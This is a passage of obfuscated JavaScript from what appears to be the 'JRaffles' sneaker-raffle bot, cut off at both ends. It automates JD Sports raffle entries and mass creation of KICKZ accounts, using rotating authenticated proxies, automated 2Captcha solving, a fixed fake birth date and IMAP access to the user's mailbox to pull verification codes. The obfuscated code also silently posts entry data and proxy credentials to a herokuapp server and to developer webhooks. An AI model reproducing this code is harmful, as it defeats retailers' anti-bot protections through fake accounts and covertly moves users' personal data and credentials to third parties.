                            let _0x5b98f9 = await _0x134338['$']('div[jsname=\x22OCpkoe\x22]');
                            if (_0x5b98f9)
                                return await _0x5b98f9['click'](), await _0x134338['waitForNavigation']({ 'waitUntil': 'networkidle2' }), _0x12aac6('New\x20Section'), _0xf915ac();
                        }
                        await _0xf915ac(), await _0x134338['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x134338['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x1ce4fb(_0x378f5e[_0x30dfc5], _0x4ab4cf), _0x4d644d = 'no';
                        var _0x30792a = await _0x11b6e5(_0x378f5e[_0x30dfc5], _0x4ab4cf, 'dev', ![]), _0x5a0625 = await _0x11b6e5(_0x378f5e[_0x30dfc5], _0x4ab4cf, 'pub', ![]);
                        let _0x334246 = _0x378f5e[_0x30dfc5];
                        try {
                            prxdata = {
                                'username': _0x34b198['replace']('#', ''),
                                'module': _0x4ab4cf['name'],
                                'entrydata': JSON['stringify'](_0x334246),
                                'proxy': '' + _0x2d23f1[_0x30dfc5]
                            };
                            var _0x26a5d3 = JSON['stringify'](prxdata);
                            let _0x2f8d7c = { 'headers': { 'content-type': 'application/json' } };
                            await _0x3da5aa['post']('https://jraffles.herokuapp.com/success', _0x26a5d3, _0x2f8d7c);
                        } catch (_0x231ab7) {
                        }
                        const _0x2bb756 = {
                            'succesDEVMSG': { 'embeds': [_0x30792a] },
                            'succesPUBMSG': { 'embeds': [_0x5a0625] }
                        };
                        try {
                            _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x2bb756['succesDEVMSG']), await _0x140651(0xc8), await _0x29bde2(_0x5ddcdd, _0x2bb756['succesDEVMSG']), await _0x140651(0xc8), await _0x29bde2(_0x259650, _0x2bb756['succesPUBMSG']);
                        } catch (_0x4f6954) {
                            console['log'](_0x16a3a0['yellow'](_0x597cbe() + '\x20[' + _0x2cb44f[taskModule]['name'] + ']\x20Task\x20' + (_0x30dfc5 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4f6954));
                        }
                        console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x4ab4cf['name'] + ']\x20Task\x20' + (_0x30dfc5 + 0x1) + '\x20:\x20Raffle\x20Entered!')), (_0xc1c681 != 0x0 || _0x37ecfd != 0x0 && !_0xd47efb) && (_0x39a60d['push'](_0x105235), _0x7a56eb['writeFileSync']('forms/templates.json', JSON['stringify'](_0x39a60d, null, 0x2), 'utf-8'));
                    } catch (_0x528d3f) {
                        console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x4ab4cf['name'] + ']\x20Task\x20' + (_0x30dfc5 + 0x1) + '\x20:\x20' + _0x528d3f)), _0x2efa0c = '' + _0x528d3f;
                        var _0x3d8030 = await _0x11b6e5(_0x378f5e[_0x30dfc5], _0x4ab4cf, 'dev', !![], _0x2efa0c);
                        let _0x571fbd = {};
                        _0x571fbd['errorDEV'] = { 'embeds': [_0x3d8030] }, _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x571fbd['errorDEV']), await _0x29bde2(_0x2cdbb9, _0x571fbd['errorDEV']), _0x4d644d = 'yes';
                    } finally {
                        _0xb20e8e && _0xb20e8e['close']();
                        if (_0x4d644d == 'yes' && _0x2997c5 != 0x5) {
                            console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x4ab4cf['name'] + ']\x20Task\x20' + (_0x30dfc5 + 0x1) + '\x20:\x20Retrying\x20(' + (_0x2997c5 + 0x1) + '\x20/\x205)')), _0x30dfc5--, _0x2997c5++;
                            continue;
                        }
                        if (_0x4d644d == 'yes' && _0x2997c5 == 0x5) {
                            _0x2997c5 = 0x0, _0x4d644d = 'no';
                            continue;
                        }
                        _0x12aac6('Waiting\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x510687, _0x44cca0, _0x413a0c) {
                var _0x11afe7 = ![], _0x55f9c7 = ![];
                if (_0x342ed0['captchaKey'] == '' || _0x342ed0['captchaKey'] == undefined)
                    return console['log'](_0x16a3a0['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x51ff47['use'](_0x30c330()), _0x51ff47['use'](_0x16fe7c({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x342ed0['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x528bb1 = 0x0; _0x528bb1 < _0x44cca0['length']; _0x528bb1++) {
                    if (_0x3052e1 != 'yes')
                        var _0x3052e1 = '', _0x5a044e = 0x0;
                    var _0x11e6cd, _0x33828f = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x44cca0[_0x528bb1]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x44cca0[_0x528bb1]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x34b198
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x342ed0['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x4e463c
                            }
                        ]
                    }];
                    const _0x3ac305 = { 'embeds': _0x33828f };
                    _0x1b4448(_0x510687['name'] + '\x20Task\x20' + (_0x528bb1 + 0x1) + '\x20/\x20' + _0x44cca0['length'] + '\x20||\x20File:\x20' + _0x318aef + '\x20Proxies:\x20' + _0x28792f);
                    try {
                        await _0x58ea73(_0x44cca0, _0x528bb1);
                    } catch {
                        _0x3052e1 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0xdff64a = await _0x11b6e5(_0x44cca0[_0x528bb1], _0x510687, 'dev', ![]), _0x352e03 = await _0x11b6e5(_0x44cca0[_0x528bb1], _0x510687, 'pub', ![]);
                    const _0x3e019d = {
                        'succesDEVMSG': { 'embeds': [_0xdff64a] },
                        'succesPUBMSG': { 'embeds': [_0x352e03] }
                    };
                    if (_0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '')
                        try {
                            await _0x29bde2(_0x342ed0['webhook'], _0x3e019d['succesDEVMSG']);
                        } catch {
                        }
                    await _0x140651(0xc8), await _0x29bde2(_0x5ddcdd, _0x3e019d['succesDEVMSG']), await _0x140651(0xc8);
                    try {
                        await _0x29bde2(_0x259650, _0x3e019d['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x44cca0[_0x528bb1]['Email'] == '' || _0x44cca0[_0x528bb1]['Url'] == '' || _0x44cca0[_0x528bb1]['FirstName'] == '' || _0x44cca0[_0x528bb1]['LastName'] == '') {
                        console['log'](_0x597cbe() + '\x20[' + _0x2cb44f[taskModule]['name'] + ']\x20Task\x20' + (_0x528bb1 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x342ed0['useRandomProxy'] = ![])
                        var _0x117516 = _0x413a0c[_0x528bb1]['split'](':');
                    else
                        var _0x210d3a = Math['round'](Math['random']() * (_0x413a0c['length'] - 0x1)), _0x117516 = _0x413a0c[_0x210d3a]['split'](':');
                    var _0x548030;
                    try {
                        _0x548030 = await _0x51ff47['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x117516[0x0] + ':' + _0x117516[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x548030 = await _0x51ff47['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x117516[0x0] + ':' + _0x117516[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x25b05f = await _0x548030['newPage']();
                        await _0x25b05f['authenticate']({
                            'username': '' + _0x117516[0x2],
                            'password': '' + _0x117516[0x3]
                        }), console['log'](_0x597cbe() + '\x20[' + _0x510687['name'] + ']\x20Task\x20' + (_0x528bb1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x25b05f['setRequestInterception'](!![]), _0x25b05f['on']('request', _0x2c46de => {
                            _0x2c46de['resourceType']() === 'image' || _0x2c46de['resourceType']() === 'font' || _0x2c46de['resourceType']() === 'media' ? _0x2c46de['abort']() : _0x2c46de['continue']();
                        });
                        try {
                            await _0x25b05f['goto']('' + _0x44cca0[_0x528bb1]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x25b05f['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x597cbe() + '\x20[' + _0x510687['name'] + ']\x20Task\x20' + (_0x528bb1 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x25b05f['type']('#comp_firstname', '' + _0x44cca0[_0x528bb1]['FirstName']), await _0x25b05f['waitForSelector']('#comp_lastname'), await _0x25b05f['type']('#comp_lastname', '' + _0x44cca0[_0x528bb1]['LastName']), await _0x25b05f['waitForSelector']('#comp_email'), await _0x25b05f['type']('#comp_email', '' + _0x44cca0[_0x528bb1]['Email']), await _0x25b05f['waitForSelector']('#comp_paypalemail'), await _0x25b05f['type']('#comp_paypalemail', '' + _0x44cca0[_0x528bb1]['Email']), await _0x25b05f['waitForSelector']('#comp_mobile_end'), await _0x25b05f['type']('#comp_mobile_end', '' + _0x44cca0[_0x528bb1]['Phone']), await _0x25b05f['waitForSelector']('#comp_dob'), await _0x25b05f['type']('#comp_dob', '08/09/1992'), console['log'](_0x597cbe() + '\x20[' + _0x510687['name'] + ']\x20Task\x20' + (_0x528bb1 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x44cca0[_0x528bb1]['Size'] == 'RANDOM') {
                            const _0xf62c37 = await _0x25b05f['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x4aca43 => {
                                return _0x4aca43['map'](_0x1f0fa9 => _0x1f0fa9['value']);
                            });
                            var _0x4b2b36 = Math['round'](Math['random']() * (_0xf62c37['length'] - 0x2));
                            await _0x25b05f['select']('#shoesize', _0xf62c37[_0x4b2b36 + 0x1]), await _0x140651(0x3e8);
                        } else {
                            const _0x339728 = await _0x25b05f['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3982ad => {
                                return _0x3982ad['map'](_0x3b6837 => _0x3b6837['innerText']);
                            }), _0x5ac325 = await _0x25b05f['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x48e4e5 => {
                                return _0x48e4e5['map'](_0x5dd838 => _0x5dd838['value']);
                            });
                            var _0x372261 = _0x44cca0[_0x528bb1]['Size'];
                            for (var _0x3a9e82 = 0x1; _0x3a9e82 < _0x5ac325['length']; _0x3a9e82++) {
                                var _0x1fcb01 = _0x339728[_0x3a9e82]['split']('\x20')[0x0];
                                if (_0x1fcb01 == _0x372261) {
                                    await _0x25b05f['select']('#shoesize', _0x5ac325[_0x3a9e82]);
                                    break;
                                } else {
                                    if (_0x3a9e82 + 0x1 == _0x5ac325['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x25b05f['waitForSelector']('#comp_address1'), await _0x25b05f['type']('#comp_address1', _0x44cca0[_0x528bb1]['Address1'] + '\x20' + _0x44cca0[_0x528bb1]['HouseNumber']), await _0x25b05f['waitForSelector']('#comp_address2'), await _0x25b05f['type']('#comp_address2', '' + _0x44cca0[_0x528bb1]['Address2']), await _0x25b05f['waitForSelector']('#comp_address2'), await _0x25b05f['type']('#comp_address3', '' + _0x44cca0[_0x528bb1]['City']), await _0x25b05f['waitForSelector']('#comp_postcode'), await _0x25b05f['type']('#comp_postcode', '' + _0x44cca0[_0x528bb1]['Zip']), console['log'](_0x597cbe() + '\x20[' + _0x510687['name'] + ']\x20Task\x20' + (_0x528bb1 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x140651(0x4b0), await _0x25b05f['click']('label#emailhold'), await _0x140651(0x5dc), await _0x25b05f['click']('#preauth_tandc_email\x20>\x20label'), await _0x140651(0x5dc), await _0x25b05f['click']('#submit');
                        try {
                            await _0x25b05f['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x597cbe() + '\x20[' + _0x510687['name'] + ']\x20Task\x20' + (_0x528bb1 + 0x1) + '\x20:\x20' + _0x16a3a0['blue']('Awaiting\x20Paypal\x20Payment')), _0x548030['on']('targetcreated', async _0x227d0e => {
                            if (_0x227d0e['type']() === 'page') {
                                const _0x448aa1 = await _0x227d0e['page']();
                                async function _0x58e1ff() {
                                    try {
                                        await _0x25b05f['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x55f9c7 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x429259() {
                                    try {
                                        await _0x25b05f['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x11afe7 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x429259(), _0x58e1ff(), await _0x140651(0x493e0);
                            }
                        });
                        async function _0x8a1840() {
                            for (let _0x32547f = 0x0; _0x32547f < 0x12c; _0x32547f++) {
                                if (_0x11afe7 == !![]) {
                                    _0x3052e1 = 'no', _0x1ce4fb(_0x44cca0[_0x528bb1], _0x510687), console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x510687['name'] + ']\x20Task\x20' + (_0x528bb1 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '')
                                        try {
                                            await _0x29bde2(_0x342ed0['webhook'], _0x3e019d['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x140651(0xc8), await _0x29bde2(_0x5ddcdd, _0x3e019d['succesDEVMSG']), await _0x140651(0xc8);
                                    try {
                                        await _0x29bde2(_0x259650, _0x3e019d['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x55f9c7)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x140651(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x140651(0xbb8), await _0x25b05f['click']('.zoid-outlet'), await _0x140651(0x7d0), await _0x8a1840();
                    } catch (_0x24b85e) {
                        console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x510687['name'] + ']\x20Task\x20' + (_0x528bb1 + 0x1) + '\x20:\x20' + _0x24b85e)), _0x11e6cd = '' + _0x24b85e;
                        var _0x93842c = await _0x11b6e5(_0x44cca0[_0x528bb1], _0x510687, 'dev', !![], _0x11e6cd);
                        _0x3e019d['errorDEV'] = { 'embeds': [_0x93842c] }, _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x3e019d['errorDEV']), await _0x29bde2(_0x2cdbb9, _0x3e019d['errorDEV']);
                    } finally {
                        _0x548030 && _0x548030['close']();
                        if (_0x3052e1 == 'yes' && _0x5a044e != 0x5 && _0x11e6cd != 'Size\x20Not\x20Found') {
                            console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x510687['name'] + ']\x20Task\x20' + (_0x528bb1 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5a044e + '\x20/\x205)')), _0x528bb1 = _0x528bb1 - 0x1, _0x5a044e = _0x5a044e + 0x1;
                            continue;
                        }
                        _0x3052e1 == 'yes' && _0x5a044e >= 0x5 && (_0x13d7e5(afew[_0x528bb1], _0x510687), _0x3052e1 = 'no', _0x5a044e = 0x0), console['log']('Waiting\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x1da99f, _0x5b8aff, _0x18e04e) {
                    _0x51ff47['use'](_0x30c330()), _0x51ff47['use'](_0x16fe7c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x342ed0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x59e2b6 = 0x0; _0x59e2b6 < _0x5b8aff['length']; _0x59e2b6++) {
                        const _0x2db0c3 = 'https://www.kickz.com/login';
                        if (_0x37c22e != 'yes')
                            var _0x37c22e = '', _0x2e3a40 = 0x0;
                        _0x1b4448(_0x1da99f['name'] + '\x20Task\x20' + (_0x59e2b6 + 0x1) + '\x20/\x20' + _0x5b8aff['length'] + '\x20||\x20File:\x20' + _0x318aef + '\x20Proxies:\x20' + _0x28792f);
                        try {
                            await _0x58ea73(_0x5b8aff, _0x59e2b6);
                        } catch {
                            _0x37c22e = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x235a01 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x34b198
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x342ed0['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x4e463c
                                }
                            ]
                        }];
                        const _0x4f35e4 = { 'embeds': _0x235a01 };
                        var _0x3c100d = await _0x11b6e5(_0x5b8aff[_0x59e2b6], _0x1da99f, 'acc', ![]);
                        const _0xea3dda = { 'succesDEVMSG': { 'embeds': [_0x3c100d] } };
                        if (_0x5b8aff[_0x59e2b6]['Email'] == '' || _0x5b8aff[_0x59e2b6]['FirstName'] == '' || _0x5b8aff[_0x59e2b6]['LastName'] == '') {
                            console['log'](_0x597cbe() + '\x20[' + _0x1da99f['name'] + ']\x20Task\x20' + (_0x59e2b6 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x5b8aff[_0x59e2b6]['Password'] == '' && (_0x5b8aff[_0x59e2b6]['Password'] = 'JRaffles23!');
                        if (_0x342ed0['useRandomProxy'] = ![])
                            var _0x3affb0 = _0x18e04e[_0x59e2b6]['split'](':');
                        else
                            var _0x44c65a = Math['round'](Math['random']() * (_0x18e04e['length'] - 0x1)), _0x3affb0 = _0x18e04e[_0x44c65a]['split'](':');
                        var _0x1950e7;
                        try {
                            _0x1950e7 = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3affb0[0x0] + ':' + _0x3affb0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1950e7 = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3affb0[0x0] + ':' + _0x3affb0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x15ae3d = await _0x1950e7['newPage']();
                            await _0x15ae3d['authenticate']({
                                'username': '' + _0x3affb0[0x2],
                                'password': '' + _0x3affb0[0x3]
                            }), console['log'](_0x597cbe() + '\x20[' + _0x1da99f['name'] + ']\x20Task\x20' + (_0x59e2b6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x15ae3d['setRequestInterception'](!![]), _0x15ae3d['on']('request', _0x534d65 => {
                                _0x534d65['resourceType']() === 'image' || _0x534d65['resourceType']() === 'font' || _0x534d65['resourceType']() === 'media' ? _0x534d65['abort']() : _0x534d65['continue']();
                            }), await _0x15ae3d['goto'](_0x2db0c3), await _0x140651(0xbb8), console['log'](_0x597cbe() + '\x20[' + _0x1da99f['name'] + ']\x20Task\x20' + (_0x59e2b6 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x15ae3d['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x15ae3d['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x15ae3d['waitForSelector']('#button-register'), await _0x140651(0x7d0), await _0x15ae3d['evaluate'](() => {
                                const _0x555917 = document['querySelector']('#button-register');
                                _0x555917['click']();
                            }), console['log'](_0x597cbe() + '\x20[' + _0x1da99f['name'] + ']\x20Task\x20' + (_0x59e2b6 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x140651(0x1388), await _0x15ae3d['waitForSelector']('#customer_salutation'), await _0x15ae3d['select']('#customer_salutation', 'mr'), await _0x140651(0x7d0), await _0x15ae3d['waitForSelector']('#customer_firstname'), await _0x15ae3d['type']('#customer_firstname', '' + _0x5b8aff[_0x59e2b6]['FirstName']), await _0x140651(0x352), await _0x15ae3d['waitForSelector']('#customer_lastname'), await _0x15ae3d['type']('#customer_lastname', '' + _0x5b8aff[_0x59e2b6]['LastName']), await _0x140651(0x352), await _0x15ae3d['type']('#email-input', '' + _0x5b8aff[_0x59e2b6]['Email']), await _0x140651(0x352), await _0x15ae3d['type']('#email-confirm-input', '' + _0x5b8aff[_0x59e2b6]['Email']), await _0x140651(0x352), await _0x15ae3d['type']('#register-password', '' + _0x5b8aff[_0x59e2b6]['Password']), await _0x140651(0x352), await _0x15ae3d['type']('#password-confirm', '' + _0x5b8aff[_0x59e2b6]['Password']), await _0x140651(0x352), console['log'](_0x597cbe() + '\x20[' + _0x1da99f['name'] + ']\x20Task\x20' + (_0x59e2b6 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x15ae3d['click']('#consent'), await _0x140651(0x1f4);
                            const _0x43ea52 = await _0x15ae3d['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x43ea52) {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x1da99f['name'] + ']\x20Task\x20' + (_0x59e2b6 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x15ae3d['click']('#buttonRegister');
                            try {
                                await _0x15ae3d['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x597cbe() + '\x20[' + _0x1da99f['name'] + ']\x20Task\x20' + (_0x59e2b6 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x5b8aff[_0x59e2b6]['Email']), await _0x140651(0x4b0);
                            async function _0x4463b() {
                                var _0x36cc50, _0x27f714 = ![];
                                for (var _0x469ad8 = 0x0; _0x469ad8 < 0x18; _0x469ad8++) {
                                    async function _0x539608() {
                                        var _0x1a731b = new _0x4d6860({
                                            'user': _0x342ed0['masterMail'],
                                            'password': _0x342ed0['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x528df9(_0x386a97) {
                                            _0x1a731b['openBox']('INBOX', ![], _0x386a97);
                                        }
                                        _0x1a731b['once']('ready', function () {
                                            console['log'](_0x597cbe() + '\x20[' + _0x1da99f['name'] + ']\x20Task\x20' + (_0x59e2b6 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x528df9(function (_0x1ff422, _0x26b1d9) {
                                                console['log'](_0x597cbe() + '\x20[' + _0x1da99f['name'] + ']\x20Task\x20' + (_0x59e2b6 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x1ff422)
                                                    throw _0x1ff422;
                                                _0x1a731b['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x543994, _0x5b0a6c) {
                                                    if (!_0x5b0a6c || !_0x5b0a6c['length'])
                                                        console['log'](_0x597cbe() + '\x20[' + _0x1da99f['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x1a731b['end']();
                                                    else {
                                                        var _0x55f213 = _0x1a731b['seq']['fetch'](_0x5b0a6c, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x55f213['on']('message', function (_0x2f6311, _0x521295) {
                                                            var _0x32d6ce = '(#' + _0x521295 + ')\x20';
                                                            _0x2f6311['on']('body', function (_0x33f624, _0x285326) {
                                                                _0x502d57(_0x33f624, (_0x555637, _0x40c282) => {
                                                                    if (_0x40c282['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x9814b3 = _0x40c282['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x32a34d = _0x9814b3[0x1]['split']('<')[0x0];
                                                                        _0x36cc50 = _0x32a34d;
                                                                    }
                                                                });
                                                            }), _0x2f6311['once']('end', function () {
                                                            });
                                                        }), _0x55f213['once']('error', function (_0x5adc91) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x55f213['once']('end', function () {
                                                            _0x1a731b['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x1a731b['once']('error', function (_0x2b9044) {
                                            console['log'](_0x16a3a0['red'](_0x2b9044['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x27f714 = !![];
                                        }), _0x1a731b['once']('end', async function () {
                                        }), _0x1a731b['connect']();
                                    }
                                    _0x539608(), await _0x140651(0x1388);
                                    if (_0x36cc50)
                                        return _0x36cc50;
                                    if (_0x27f714)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x469ad8 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x4463b(), _0x140651(0x320), console['log'](_0x597cbe() + '\x20[' + _0x1da99f['name'] + ']\x20Task\x20' + (_0x59e2b6 + 0x1) + '\x20:\x20Verifying..'), await _0x15ae3d['type']('#verificationCode', code), await _0x140651(0x1f4), await _0x15ae3d['click']('#buttonVerify'), await _0x140651(0x190), await _0x15ae3d['click']('#buttonVerify'), await _0x140651(0x3e8);
                            try {
                                await _0x15ae3d['waitForSelector']('div.b-user_greeting'), _0x37c22e = 'no', console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x1da99f['name'] + ']\x20Task\x20' + (_0x59e2b6 + 0x1) + '\x20:\x20Account\x20' + _0x5b8aff[_0x59e2b6]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x7a56eb['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x5b8aff[_0x59e2b6]['Email'] + ',' + _0x5b8aff[_0x59e2b6]['Password'] + ','), console['log'](_0x597cbe() + '\x20[' + _0x1da99f['name'] + ']\x20Task\x20' + (_0x59e2b6 + 0x1) + '\x20:\x20Account\x20' + _0x5b8aff[_0x59e2b6]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0xea3dda['succesDEVMSG']);
                                } catch {
                                }
                                await _0x29bde2(_0x36741f, _0xea3dda['succesDEVMSG']);
                            } catch {
                                _0x37c22e = 'no', console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x1da99f['name'] + ']\x20Task\x20' + (_0x59e2b6 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x1da99f['name'] + ']\x20Task\x20' + (_0x59e2b6 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x16cc6f) {
                            console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x1da99f['name'] + ']\x20Task\x20' + (_0x59e2b6 + 0x1) + '\x20:\x20' + _0x16cc6f)), _0x235a01[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x235a01[0x0]['description'] = '' + _0x16cc6f, await _0x29bde2(_0x2cdbb9, _0x4f35e4), _0x37c22e = 'yes';
                        } finally {
                            _0x1950e7 && _0x1950e7['close']();
                            if (_0x37c22e == 'yes' && _0x2e3a40 != 0x5) {
